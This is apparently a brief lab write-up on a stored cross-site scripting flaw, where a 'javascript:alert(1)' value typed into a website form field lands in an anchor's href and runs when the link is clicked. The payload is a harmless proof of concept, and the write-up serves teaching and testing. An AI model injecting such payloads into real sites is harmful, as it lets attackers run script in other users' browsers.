# **Stored XSS into anchor `href` attribute with double quotes HTML-encoded**

This one works because the system is not escaping the javascript: prefix and the :() characters.

The payload is:

```
javascript:alert(1)
```

In the website form value.

The url will be

```
<a id="author" href="javascript:alert(1)">Name </a>
```

So when it is clicked it will run the alert(1) payload.
